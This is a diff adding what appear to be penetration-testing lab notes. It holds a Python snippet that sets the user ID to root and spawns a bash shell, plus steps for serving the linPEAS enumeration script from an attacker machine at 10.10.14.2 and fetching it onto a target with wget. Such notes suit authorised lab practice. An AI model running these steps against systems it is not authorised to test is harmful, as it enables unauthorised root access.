@@ -1,0 +1,17 @@
+import os
+os.setuid(0)
+os.system("/bin/bash")
+
+
+
+
+// steps
+
+cp /home/kali/PrivEsc/linPEAS/linpeas.sh ./linpeas.sh
+
+1. Run http server
+python3 -m http.server 8080
+
+2. wget ip:8080/linpeas.sh  [ip = 10.10.14.2 ]
+
+3. chmod +x linpeas.sh
